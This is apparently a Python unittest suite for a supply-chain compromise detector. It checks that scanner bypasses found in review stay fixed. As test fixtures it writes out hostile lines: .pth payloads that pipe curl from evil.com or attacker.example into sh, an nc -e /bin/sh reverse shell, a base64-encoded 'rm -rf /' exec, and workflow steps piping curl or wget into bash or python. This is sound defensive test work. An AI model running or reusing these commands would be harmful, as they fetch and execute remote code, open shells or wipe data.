"""Property tests for scripts/detect_compromise.py.

Lock in the bypass-class fixes the bots + subagent caught across PR #44
rounds so a future refactor can't silently re-open them. Each test
constructs a synthetic input that EXACTLY triggers the historical
bypass and asserts the scanner now catches it.

Sources of the bypass classes:
  - Subagent 4cc0bb4 (CRITICAL): MULTILINE missing → line-2+ .pth payload
  - Subagent 4cc0bb4 (CRITICAL): allowlist prefix-only → tampered file
  - Subagent 4cc0bb4 (HIGH): rglob depth → .pth in subdir
  - CodeRabbit + Codex 3fe4154: PEP 508 extras `litellm[proxy]`
  - CodeRabbit 3fe4154: `.yaml` vs `.yml` workflow extension
  - Gemini security-high 3fe4154 + Codex P2: PEP 508 markers, direct refs, comments
  - Gemini security-medium 9a20e14: workflow `python` shell, backtick eval
  - Codex P2 9a20e14: eval with whitespace inside subshell
  - Gemini HIGH 9a20e14: substring-vs-parts exclusion bypass
"""
from __future__ import annotations

import shutil
import sys
import tempfile
import unittest
from pathlib import Path

# Add scripts/ to sys.path so we can import detect_compromise as a module.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts"))

import detect_compromise as dc  # noqa: E402


class _TempDirTestBase(unittest.TestCase):
    """Base class that auto-cleans tempfile.mkdtemp() between tests.
    Gemini medium on d53c64f noted the previous suite leaked temp
    dirs on every run. ``_mkdtemp()`` returns a Path and registers
    its cleanup via self.addCleanup; ignore_errors=True so a still-
    locked file on Windows doesn't fail the test."""

    def _mkdtemp(self) -> Path:
        p = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, p, ignore_errors=True)
        return p


# ── PTH file scanning ──────────────────────────────────────────────────


class PthMultilineRegexTests(_TempDirTestBase):
    """Lock in the MULTILINE fix from subagent CRITICAL on 4cc0bb4."""

    def _make_venv(self, pth_content: bytes) -> Path:
        """Build an ephemeral venv directory tree with a single .pth file."""
        tmp = self._mkdtemp()
        sp = tmp / "venv" / "Lib" / "site-packages"
        sp.mkdir(parents=True)
        (sp / "attack.pth").write_bytes(pth_content)
        return tmp / "venv"

    def test_payload_on_first_line_caught(self):
        venv = self._make_venv(b"import os; os.system('echo pwn')\n")
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok, "line-1 import should still match")

    def test_payload_on_second_line_caught(self):
        """The CRITICAL bypass: legit path line 1 + payload line 2.
        Without MULTILINE, ``^\\s*import`` only matched the very start
        of the bytes object, missing the payload entirely."""
        venv = self._make_venv(
            b"/usr/local/lib/python3.11/site-packages\n"
            b"import os; os.system('curl http://c2.evil.com/payload | sh')\n"
        )
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok, "line-2 import must match (MULTILINE)")

    def test_payload_with_exec_caught(self):
        venv = self._make_venv(
            b"/some/legit/path\n"
            b"exec(__import__('base64').b64decode('cm0gLXJmIC8K'))\n"
        )
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok)

    def test_payload_with_subprocess_caught(self):
        venv = self._make_venv(b"/x\nsubprocess.run(['nc', '-e', '/bin/sh', 'evil', '1337'])\n")
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertFalse(result.ok)

    def test_payload_in_subdirectory_caught(self):
        """Subagent HIGH on 4cc0bb4: rglob('site-packages/*.pth') only
        matched DIRECT children of site-packages. A payload in a
        sub-package dir was invisible."""
        tmp = self._mkdtemp()
        deep = tmp / "venv" / "Lib" / "site-packages" / "malicious_pkg"
        deep.mkdir(parents=True)
        (deep / "attack.pth").write_bytes(b"import os\nos.system('evil')\n")
        result = dc.check_pth_files_for_exec_code([tmp / "venv"])
        self.assertFalse(result.ok, "subdir .pth must match")

    def test_legitimate_path_only_pth_passes(self):
        """A normal .pth file is just directory paths, no executable code."""
        venv = self._make_venv(b"/path/one\n/path/two\n/path/three\n")
        result = dc.check_pth_files_for_exec_code([venv])
        self.assertTrue(result.ok, "path-only .pth must not false-positive")


class PthAllowlistTamperTests(_TempDirTestBase):
    """Lock in the allowlist exact-match fix from subagent CRITICAL on
    4cc0bb4. The original prefix-only check let a tampered file with
    the known-good magic-bytes prefix + appended payload sail through."""

    def test_legit_distutils_precedence_pth_allowlisted(self):
        tmp = self._mkdtemp()
        f = tmp / "distutils-precedence.pth"
        f.write_bytes(
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            b"enabled = os.environ.get(var, 'local') == 'local'; "
            b"enabled and __import__('_distutils_hack').add_shim();"
        )
        self.assertTrue(dc._pth_is_allowlisted(f), "exact-content match")

    def test_tampered_pth_rejected_from_allowlist(self):
        """The bypass: legit prefix + appended exec payload, fits within
        300-byte size limit. Previously slipped through; now rejected."""
        tmp = self._mkdtemp()
        f = tmp / "distutils-precedence.pth"
        f.write_bytes(
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            b"os.system('curl http://attacker.example/x')"
        )
        self.assertFalse(
            dc._pth_is_allowlisted(f),
            "tampered file MUST NOT be allowlisted (subagent CRITICAL fix)",
        )

    def test_legit_file_with_trailing_newline_still_allowlisted(self):
        """The allowlist must tolerate harmless whitespace differences
        (a trailing newline from a text editor) — only meaningful
        content changes should fail it."""
        tmp = self._mkdtemp()
        f = tmp / "distutils-precedence.pth"
        f.write_bytes(
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            b"enabled = os.environ.get(var, 'local') == 'local'; "
            b"enabled and __import__('_distutils_hack').add_shim();\n"
        )
        self.assertTrue(dc._pth_is_allowlisted(f))


# ── Compromised-PyPI regex ─────────────────────────────────────────────


class CompromisedPyPIRegexTests(_TempDirTestBase):
    """Lock in the PEP 508 form coverage. Across rounds the bots
    found bypasses for: bare name, extras, version specifiers, environment
    markers, direct references, trailing comments."""

    def _scan(self, requirements_content: str) -> dc.CheckResult:
        tmp = self._mkdtemp()
        (tmp / "requirements.txt").write_text(requirements_content)
        return dc.check_compromised_pypi_in_deps(tmp)

    def test_bare_name_caught(self):
        self.assertFalse(self._scan("litellm").ok)

    def test_name_with_extras_caught(self):
        """CodeRabbit + Codex on 3fe4154: extras bypass."""
        self.assertFalse(self._scan("litellm[proxy]").ok)

    def test_name_with_extras_and_version_caught(self):
        self.assertFalse(self._scan("litellm[proxy]==1.30.0").ok)

    def test_version_specifier_caught(self):
        self.assertFalse(self._scan("litellm==1.30.0").ok)

    def test_range_specifier_caught(self):
        self.assertFalse(self._scan("litellm>=1.0,<2.0").ok)

    def test_trailing_comment_caught(self):
        """Gemini MEDIUM on 0e16c8d: trailing-comment bypass."""
        self.assertFalse(self._scan("litellm  # outdated").ok)

    def test_environment_marker_caught(self):
        """Codex P2 on 0e16c8d: PEP 508 environment-marker bypass."""
        self.assertFalse(
            self._scan('litellm; python_version<"3.12"').ok,
        )

    def test_direct_reference_caught(self):
        """Codex P2 on 0e16c8d: PEP 508 direct-reference URL bypass."""
        self.assertFalse(
            self._scan("litellm @ https://example.com/litellm.tar.gz").ok,
        )

    def test_durabletask_caught(self):
        """The other half of the COMPROMISED_PYPI tuple."""
        self.assertFalse(self._scan("durabletask==1.0.0").ok)

    def test_unrelated_package_not_flagged(self):
        """Verify we don't false-positive on a package that just
        STARTS with the same letters."""
        result = self._scan("litellm-replacement==1.0.0\nlitellm-mock==0.1.0\n")
        # neither line is bare 'litellm' followed by [/=/etc/;/@/#/EOL
        self.assertTrue(
            result.ok,
            "'litellm-replacement' must not match the 'litellm' pattern",
        )

    def test_whitespace_before_extras_caught(self):
        """Gemini medium on d53c64f: PEP 508 allows whitespace between
        the package name and the extras bracket. ``litellm [proxy]``
        is legal and must match."""
        self.assertFalse(self._scan("litellm [proxy]==1.30.0").ok)
        self.assertFalse(self._scan("litellm   [proxy,extra]==1.30.0").ok)


class CompromisedPyPIExcludePathsTests(_TempDirTestBase):
    """Lock in the path-parts (not substring) exclusion from Gemini HIGH
    on 9a20e14."""

    def test_legitimate_dir_with_venv_substring_scanned(self):
        """A user project dir named ``my-venv-project/`` would be
        wrongly excluded by the prior substring matcher. It must be
        scanned now."""
        tmp = self._mkdtemp()
        legit_dir = tmp / "my-venv-project"
        legit_dir.mkdir()
        (legit_dir / "requirements.txt").write_text("litellm==1.0.0")
        # Scan from a parent root so the file IS discovered, but with
        # the matcher we've installed.
        result = dc.check_compromised_pypi_in_deps(tmp)
        self.assertFalse(
            result.ok,
            "requirements.txt in my-venv-project/ must be scanned",
        )

    def test_requirements_dist_txt_scanned(self):
        """A file named ``requirements-dist.txt`` would be wrongly
        excluded by the prior substring matcher (matched "dist/")."""
        tmp = self._mkdtemp()
        (tmp / "requirements-dist.txt").write_text("litellm==1.0.0")
        result = dc.check_compromised_pypi_in_deps(tmp)
        self.assertFalse(result.ok, "requirements-dist.txt must be scanned")

    def test_real_venv_excluded(self):
        """A real venv site-packages requirements.txt must NOT be
        scanned (would always false-positive on a venv with the
        compromised package legitimately installed-pre-discovery)."""
        tmp = self._mkdtemp()
        venv_sp = tmp / "venv" / "Lib" / "site-packages"
        venv_sp.mkdir(parents=True)
        (venv_sp / "requirements.txt").write_text("litellm==1.0.0")
        result = dc.check_compromised_pypi_in_deps(tmp)
        # Should be OK because the file is inside an excluded dir.
        self.assertTrue(
            result.ok,
            "venv/Lib/site-packages/requirements.txt must be excluded",
        )

    def test_repo_parent_named_dist_does_not_skip_scan(self):
        """Gemini security-high on 3fe4154: prior code used
        ``p.parts`` of the absolute path, so if the repo lived under
        a parent dir named ``dist`` / ``venv`` / etc., the IoC scan
        was silently disabled for every file inside. Fix: use
        ``relative_to(repo_root).parts``. Replicate by nesting the
        synthetic repo inside a ``dist/`` parent."""
        tmp = self._mkdtemp()
        repo = tmp / "dist" / "project"
        repo.mkdir(parents=True)
        (repo / "requirements.txt").write_text("litellm==1.0.0")
        result = dc.check_compromised_pypi_in_deps(repo)
        self.assertFalse(
            result.ok,
            "scan must run even when repo_root is nested under a 'dist' parent",
        )

    def test_dotgit_directory_excluded(self):
        """Gemini medium on 3fe4154: ``.git`` should be excluded
        from the rglob walk — slow on big repos and any file inside
        is not user-authored deps. Drop a synthetic
        ``requirements.txt`` inside ``.git/`` and confirm it isn't
        scanned."""
        tmp = self._mkdtemp()
        gitdir = tmp / ".git" / "info"
        gitdir.mkdir(parents=True)
        (gitdir / "requirements.txt").write_text("litellm==1.0.0")
        result = dc.check_compromised_pypi_in_deps(tmp)
        self.assertTrue(
            result.ok,
            ".git/info/requirements.txt must NOT be scanned",
        )


# ── Workflow .yml + .yaml + pattern coverage ───────────────────────────


class WorkflowScanCoverageTests(_TempDirTestBase):
    """Lock in the .yaml extension fix (CodeRabbit on 3fe4154) and the
    broadened pattern set (Gemini security-medium on 9a20e14)."""

    def _make_repo(self, workflows: dict[str, str]) -> Path:
        tmp = self._mkdtemp()
        wf_dir = tmp / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        for name, body in workflows.items():
            (wf_dir / name).write_text(body)
        return tmp

    def test_curl_pipe_bash_caught_in_yml(self):
        repo = self._make_repo({
            "x.yml": "name: x\non: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
                     "    steps:\n      - run: curl https://evil.com/x.sh | bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_curl_pipe_bash_caught_in_yaml(self):
        """`.yaml` extension was a bypass on 3fe4154."""
        repo = self._make_repo({
            "x.yaml": "name: x\non: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
                     "    steps:\n      - run: curl https://evil.com/x.sh | bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, ".yaml extension must be scanned")

    def test_sudo_prefix_caught(self):
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_python_pipe_caught(self):
        """Gemini security-medium on 9a20e14: multi-stage payloads use
        ``curl ... | python -``."""
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/payload.py | python -\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, "python pipe-target must be caught")

    def test_process_substitution_caught(self):
        repo = self._make_repo({
            "x.yml": "run: bash <(curl https://evil.com/x.sh)\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_eval_subshell_with_whitespace_caught(self):
        """Codex P2 on ba11712: ``eval $( curl ...)`` (space after $()
        was a bypass."""
        repo = self._make_repo({
            "x.yml": "run: eval $( curl -fsSL https://evil.com )\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, "eval with whitespace must be caught")

    def test_eval_backtick_caught(self):
        repo = self._make_repo({
            "x.yml": "run: eval `curl https://evil.com`\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_benign_curl_not_flagged(self):
        """Negative case — a legitimate curl-to-file or curl-to-stdout
        without piping to a shell must not flag."""
        repo = self._make_repo({
            "x.yml": "run: curl -o data.json https://example.com/data.json\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertTrue(result.ok, "non-shell curl must NOT false-positive")

    def test_absolute_path_shell_caught(self):
        """Gemini security-medium on 03d05e5: attackers commonly use
        absolute paths (``/bin/bash``, ``/usr/bin/python3``) to bypass
        simple shell-name filters."""
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | /bin/bash\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok, "absolute-path shell must be caught")

    def test_sudo_with_absolute_path_caught(self):
        """``/usr/bin/sudo bash`` and ``sudo /bin/bash`` are both legal
        invocations — both must trip the pattern."""
        repo1 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | /usr/bin/sudo bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo1).ok,
        )
        repo2 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo /bin/bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo2).ok,
        )

    def test_python_version_suffix_caught(self):
        """``python3.11`` is a real invocation form — must match
        despite the trailing version digits."""
        repo = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.py | /usr/bin/python3.11\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_eval_backtick_with_whitespace_caught(self):
        """Gemini security-medium on 03d05e5: `` `\\s+curl ...\\s+` `` —
        whitespace tolerance inside backticks."""
        repo = self._make_repo({
            "x.yml": "run: eval ` curl https://evil.com `\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertFalse(result.ok)

    def test_actions_uses_not_flagged(self):
        """Negative case — a normal ``actions/checkout@v4`` line uses
        the ``/`` character that's in our path-prefix pattern. Must
        NOT trip the pattern."""
        repo = self._make_repo({
            "x.yml": "run: actions/checkout@v4\n",
        })
        result = dc.check_workflows_for_suspicious_commits(repo)
        self.assertTrue(result.ok)

    def test_sudo_with_flags_caught(self):
        """Gemini medium on d53c64f: ``sudo -E bash`` /
        ``sudo -u root bash`` are common malicious payload forms.
        The sudo group now accepts trailing flag chains."""
        repo1 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo -E bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo1).ok,
            "sudo -E bash must be caught",
        )
        repo2 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | sudo -E -H -u root /bin/bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo2).ok,
            "sudo with multiple flags + abs-path must be caught",
        )

    def test_multipipe_curl_caught(self):
        """Gemini security-medium on 2ced5b6: attackers obfuscate
        ``curl | bash`` with intermediate piped commands like
        ``curl | grep | bash`` or ``curl | tee /tmp/x | bash``.
        Single-pipe regex misses these."""
        repo1 = self._make_repo({
            "x.yml": "run: curl https://evil.com/x.sh | grep -v garbage | bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo1).ok,
            "curl | grep | bash multi-pipe must be caught",
        )
        repo2 = self._make_repo({
            "x.yml": (
                "run: curl https://evil.com/x.sh | tee /tmp/payload "
                "| sed 's/foo/bar/' | sh\n"
            ),
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo2).ok,
            "curl | tee | sed | sh triple-pipe must be caught",
        )

    def test_multipipe_wget_caught(self):
        """Same multi-pipe obfuscation but with wget. Gemini
        security-medium on 2ced5b6 paired this with the curl
        finding."""
        repo = self._make_repo({
            "x.yml": (
                "run: wget https://evil.com/x.sh -O- | grep payload "
                "| python3\n"
            ),
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo).ok,
            "wget multi-pipe to python3 must be caught",
        )

    def test_backslash_continuation_caught(self):
        """Codex P1 on 15bd7bb: ``curl X \\<newline>| bash`` was a
        false-negative because the regex hard-stops at newline.
        Now stitched via ``\\<newline> → space`` preprocessing."""
        repo = self._make_repo({
            "x.yml": (
                "run: |\n"
                "  curl https://evil.com/x.sh \\\n"
                "    | bash\n"
            ),
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo).ok,
            "backslash-continued curl|bash must be caught",
        )

    def test_wget_without_O_dash_caught(self):
        """Codex P1 on 15bd7bb: previous wget regex required ``-O-``
        right before the pipe. ``wget https://evil | sh`` and
        ``wget -qO- https://evil | sh`` are equivalent payloads
        and must trigger."""
        repo1 = self._make_repo({
            "x.yml": "run: wget https://evil.com/x.sh | sh\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo1).ok,
            "wget without -O- must be caught",
        )
        repo2 = self._make_repo({
            "x.yml": "run: wget -qO- https://evil.com/x.sh | bash\n",
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo2).ok,
            "wget -qO- short form must be caught",
        )
        repo3 = self._make_repo({
            "x.yml": (
                "run: wget --output-document=- https://evil.com/x.sh "
                "| bash\n"
            ),
        })
        self.assertFalse(
            dc.check_workflows_for_suspicious_commits(repo3).ok,
            "wget --output-document=- must be caught",
        )


# ── git remote URL redaction ───────────────────────────────────────────


class GitRemoteRedactionTests(unittest.TestCase):
    """Codex P1 on 2ced5b6: ``git remote -v`` lines printed verbatim
    can leak tokenized HTTPS bearer secrets to logs. The redactor
    must strip the ``user[:pass]@`` authority segment before
    rendering, while passing through SSH remotes (no creds) and
    unauthenticated HTTPS untouched."""

    def test_https_token_redacted(self):
        line = (
            "origin\thttps://x-access-token:ghp_secrettoken@github.com/"
            "owner/repo.git (fetch)"
        )
        out = dc._redact_remote_line(line)
        self.assertNotIn("ghp_secrettoken", out)
        self.assertNotIn("x-access-token", out)
        self.assertIn("<REDACTED>", out)
        self.assertIn("github.com/owner/repo.git", out)

    def test_https_user_password_redacted(self):
        line = (
            "origin\thttps://alice:hunter2@gitlab.example.com/proj.git "
            "(fetch)"
        )
        out = dc._redact_remote_line(line)
        self.assertNotIn("alice", out)
        self.assertNotIn("hunter2", out)
        self.assertIn("<REDACTED>", out)

    def test_ssh_remote_passes_through(self):
        line = "origin\tgit@github.com:owner/repo.git (fetch)"
        out = dc._redact_remote_line(line)
        # SSH ``user@host:path`` is not URL-shaped — no ``://`` so the
        # regex doesn't match. Line returned unchanged.
        self.assertEqual(out, line)

    def test_plain_https_passes_through(self):
        line = "origin\thttps://github.com/owner/repo.git (fetch)"
        out = dc._redact_remote_line(line)
        self.assertEqual(out, line)
        self.assertNotIn("<REDACTED>", out)


class GithubReposAlertReportingTests(unittest.TestCase):
    """Gemini medium on 9ffd0d9 (2026-05-22): the GitHub repos check
    used ``repo['name']`` for alert messages while using
    ``repo.get('name')`` for the lowercase comparison key. Inconsistent
    access — a ``gh`` output without ``name`` (theoretically possible
    if the API schema changes) would raise ``KeyError`` mid-loop and
    crash the alert reporting phase. Fix on 9ffd0d9-next: use a
    ``repo_name = repo.get("name") or "unknown"`` local consistently
    in the alert message.

    Pin the fix at the source level so a future refactor can't
    silently reintroduce the indexing-vs-get asymmetry."""

    def test_alert_message_uses_safe_get_not_subscript(self):
        src = (_REPO_ROOT / "scripts" / "detect_compromise.py").read_text(
            encoding="utf-8"
        )
        # The forbidden patterns: repo['name'] in alert message
        # construction. (We keep ``repo.get("name")`` for the
        # lowercase comparison key — that wasn't the bug.)
        forbidden = (
            "REPO MARKER MATCH: {repo['name']}",
            "REPO DUNE-NAME MATCH: {repo['name']}",
        )
        for needle in forbidden:
            self.assertNotIn(
                needle, src,
                f"detect_compromise.py reintroduced KeyError-prone "
                f"alert format: {needle!r}",
            )
        # The new safe pattern MUST be present.
        self.assertIn(
            'repo_name = repo.get("name") or "unknown"', src,
            "detect_compromise.py is missing the safe repo_name local",
        )
        # And the alert messages MUST use the safe local.
        self.assertIn(
            "REPO MARKER MATCH: {repo_name}", src,
            "REPO MARKER MATCH alert must use the safe repo_name local",
        )
        self.assertIn(
            "REPO DUNE-NAME MATCH: {repo_name}", src,
            "REPO DUNE-NAME MATCH alert must use the safe repo_name local",
        )


class SandboxInstallBatExitCodeTests(unittest.TestCase):
    """Codex P1 on 9ffd0d9 (2026-05-22): scripts/sandbox_install.bat
    ended with unconditional ``exit /b 0`` even if pip install or
    pip_audit failed. Callers got a false green and continued with
    a broken / unaudited sandbox. Fix on 9ffd0d9-next: errorlevel
    checks after each pip step + propagate pip_audit's exit code
    via a FINAL_RC variable.

    Pin the fix at the source level."""

    def test_bat_propagates_install_failures(self):
        src = (_REPO_ROOT / "scripts" / "sandbox_install.bat").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: an unconditional ``exit /b 0`` at the
        # end of the script. Replaced with ``exit /b !FINAL_RC!``.
        # We check for the trailing form specifically — earlier
        # ``exit /b 2/3/4/5/6`` are explicit error exits and must
        # stay (those handle FATAL: paths).
        lines = [ln.rstrip() for ln in src.splitlines()]
        # Locate the final exit line.
        final_exit = None
        for ln in reversed(lines):
            if ln.strip().startswith("exit /b"):
                final_exit = ln.strip()
                break
        self.assertIsNotNone(final_exit, "no exit /b found in sandbox_install.bat")
        assert final_exit is not None  # for type checkers
        # Must be the FINAL_RC form, NOT a hard-coded 0.
        self.assertEqual(
            final_exit, "exit /b !FINAL_RC!",
            "sandbox_install.bat must end with ``exit /b !FINAL_RC!`` "
            f"(got {final_exit!r}) so caller sees real pip_audit exit code",
        )
        # FINAL_RC must be captured from pip_audit (errorlevel check
        # immediately after the pip_audit invocation).
        self.assertIn("pip_audit --strict", src)
        self.assertIn('set "FINAL_RC=!errorlevel!"', src)

    def test_bat_propagates_pip_install_failures(self):
        src = (_REPO_ROOT / "scripts" / "sandbox_install.bat").read_text(
            encoding="utf-8"
        )
        # At least 3 errorlevel checks after pip operations:
        # 1) pip self-upgrade + pip-audit install
        # 2) requirements install (hashed or unhashed)
        # 3) pip_audit
        # Count distinct ``if errorlevel 1`` blocks; expect >= 4
        # (the three pip steps + the venv creation step).
        errorlevel_checks = src.count("if errorlevel 1")
        self.assertGreaterEqual(
            errorlevel_checks, 4,
            f"sandbox_install.bat must check errorlevel after each pip "
            f"operation; found only {errorlevel_checks} ``if errorlevel 1`` "
            f"blocks (expected >= 4)",
        )


class BatFilesNoDevNullTests(unittest.TestCase):
    """Subagent BLOCKER on 7653c73 (2026-05-22): sandbox_install.bat
    line 13 used ``where python >/dev/null 2>/dev/null`` which on
    Windows cmd.exe creates a LITERAL file named ``null`` (or a
    ``dev\\null`` directory tree) in the working directory — direct
    violation of the CLAUDE.md NON-NEGOTIABLE rule that ``nul`` files
    must not exist in any commit or working tree.

    The fix in 7653c73-next uses ``>nul 2>nul`` (Windows convention).
    This test scans every committed .bat / .cmd file in the repo for
    the forbidden ``/dev/null`` POSIX path so any future contributor
    or auto-formatter that swaps Windows ``nul`` -> POSIX
    ``/dev/null`` is caught at test time.

    Pin the rule across the whole .bat surface, not just the one
    file the subagent flagged. The audit_deps.bat + safe_install.bat
    siblings already use ``>nul 2>nul`` correctly; this test
    prevents future drift in either direction."""

    def test_no_bat_file_contains_dev_null(self):
        offenders: list[str] = []
        for ext in ("*.bat", "*.cmd"):
            for p in _REPO_ROOT.rglob(ext):
                # Skip vendored / third-party stuff if any (rPPG is the
                # only vendored .bat-bearing subtree on this branch).
                if "rPPG" in p.parts:
                    continue
                # Also skip the .venv and other generated dirs that
                # might contain shipped .bat scripts from packages.
                if any(part in {".venv", ".venv311", "venv", "node_modules", "site-packages"} for part in p.parts):
                    continue
                try:
                    text = p.read_text(encoding="utf-8", errors="replace")
                except OSError:
                    continue
                if "/dev/null" in text:
                    rel = p.relative_to(_REPO_ROOT).as_posix()
                    # Find the offending lines for a helpful message.
                    lines = [
                        f"  {rel}:{i+1}: {ln.rstrip()}"
                        for i, ln in enumerate(text.splitlines())
                        if "/dev/null" in ln
                    ]
                    offenders.extend(lines)
        self.assertFalse(
            offenders,
            "CLAUDE.md NON-NEGOTIABLE: .bat / .cmd files must NEVER use "
            "/dev/null (POSIX). On Windows cmd.exe this creates a literal "
            "``null`` file in the working tree. Use ``>nul 2>nul`` instead.\n\n"
            "Offending lines:\n" + "\n".join(offenders),
        )

    def test_no_echo_line_has_unescaped_version_redirect(self):
        """v2.17 (Gemini caught a real bug I missed 2026-06-03): an ``echo``
        line printing a pip spec like ``scipy>=1.11,<2`` has UNESCAPED ``>`` /
        ``<``, which cmd.exe treats as REDIRECTION — ``echo scipy>=1.11`` writes
        "scipy" to a file named ``=1.11`` instead of printing it, breaking the
        manual-recovery hint AND littering a stray file. In an echo line the
        ``>`` / ``<`` MUST be caret-escaped (``^>`` / ``^<``).

        Scan every .bat/.cmd ``echo`` line for a ``>`` or ``<`` that is NOT
        preceded by a caret and is NOT a deliberate redirect (``>nul``,
        ``>>"%LOG%"``, ``2>&1``). Heuristic: flag a ``>``/``<`` that has a
        non-space, non-caret char immediately before it (i.e. it's glued to a
        token like ``scipy>=`` or ``,<2``) — a real redirect has a space before
        the operator (``echo foo >nul``).
        """
        import re

        offenders: list[str] = []
        # A ">" or "<" glued to the previous char (not space, not caret) inside
        # an echo line == an unescaped version specifier redirect.
        glued = re.compile(r'(?<![\s^])[<>]')
        for ext in ("*.bat", "*.cmd"):
            for p in _REPO_ROOT.rglob(ext):
                if "rPPG" in p.parts:
                    pass  # rPPG .bat IS ours — still check it
                if any(part in {".venv", ".venv311", "venv", "node_modules", "site-packages", ".recovery", ".git"} for part in p.parts):
                    continue
                try:
                    text = p.read_text(encoding="utf-8", errors="replace")
                except OSError:
                    continue
                for i, ln in enumerate(text.splitlines()):
                    stripped = ln.lstrip()
                    if not stripped.lower().startswith("echo "):
                        continue
                    # Strip the leading "echo " then look for glued < / > that
                    # isn't caret-escaped. Remove already-escaped ^>/^< AND any
                    # deliberate redirect tails (a SPACE-separated `>nul`,
                    # `>>"%LOG%"`, `2>&1`) before testing, so only a token-glued
                    # operator (scipy>=, ,<2) trips the check.
                    body = stripped[5:].replace("^>", "").replace("^<", "")
                    # Drop trailing/space-led redirects: anything from a
                    # whitespace-preceded > or < to end-of-line is a real redirect.
                    body = re.sub(r'\s+\d*[<>]{1,2}.*$', '', body)
                    if glued.search(body):
                        rel = p.relative_to(_REPO_ROOT).as_posix()
                        offenders.append(f"  {rel}:{i+1}: {ln.rstrip()}")
        self.assertFalse(
            offenders,
            "Unescaped > / < glued to a token inside an `echo` line: cmd.exe "
            "treats these as redirection (e.g. `echo scipy>=1.11` writes to a "
            "file `=1.11`). Caret-escape them as ^> / ^<.\n\n"
            "Offending lines:\n" + "\n".join(offenders),
        )


class SafeInstallBatCallSemanticsTests(unittest.TestCase):
    """Codex P1 on 49702c0 (2026-05-22): scripts/safe_install.bat
    executed ``%*`` to run the install command. On Windows, the npm /
    pnpm / yarn entry points are batch files (npm.cmd, pnpm.cmd,
    yarn.cmd). Without ``call`` prefix, control transfers to the
    invoked batch file and NEVER RETURNS to safe_install.bat — the
    audit section runs zero times for the very install commands the
    script advertises supporting. ``call %*`` keeps control in the
    parent script after the child .cmd exits.

    Lock the fix at the source level so a future refactor can't
    silently drop the ``call`` prefix."""

    def test_safe_install_bat_uses_call_for_batch_wrappers(self):
        src = (_REPO_ROOT / "scripts" / "safe_install.bat").read_text(
            encoding="utf-8"
        )
        # The canonical fixed form must be present.
        self.assertIn(
            "\ncall %*\n", src,
            "safe_install.bat must use ``call %*`` so control returns "
            "from npm.cmd / pnpm.cmd / yarn.cmd batch wrappers"
        )
        # The forbidden bare form ``%*\n`` (without call prefix) must
        # NOT be present as a top-level statement. We check by looking
        # for a line that consists entirely of ``%*`` (the historical
        # buggy form). The ``echo`` line ``echo [safe-install] running: %*``
        # has %* in the middle of a line and is fine.
        for ln in src.splitlines():
            stripped = ln.strip()
            self.assertNotEqual(
                stripped, "%*",
                "safe_install.bat regressed to bare ``%*`` invocation "
                "(without call prefix) — npm.cmd / pnpm.cmd / yarn.cmd "
                "will not return to this script"
            )


class InstallPrecommitHooksPathTests(unittest.TestCase):
    """Codex P2 on 49702c0 (2026-05-22): the installer always wrote to
    ``<gitdir>/hooks/pre-commit``, but git IGNORES that path when
    ``core.hooksPath`` is set (repo-local or global). Users on
    lefthook / husky / pre-commit.com setups got a "successfully
    installed" message while their commits remained unaudited.

    Fix on 49702c0-next: resolve ``git config --get core.hooksPath``
    first, fall back to ``<gitdir>/hooks`` only when unset."""

    def test_installer_reads_core_hookspath(self):
        src = (_REPO_ROOT / "scripts" / "install-precommit.sh").read_text(
            encoding="utf-8"
        )
        self.assertIn(
            "core.hooksPath", src,
            "install-precommit.sh must check core.hooksPath before "
            "writing the hook"
        )
        self.assertIn(
            'git config --get core.hooksPath', src,
            "install-precommit.sh must use ``git config --get`` to read "
            "the hooksPath value"
        )
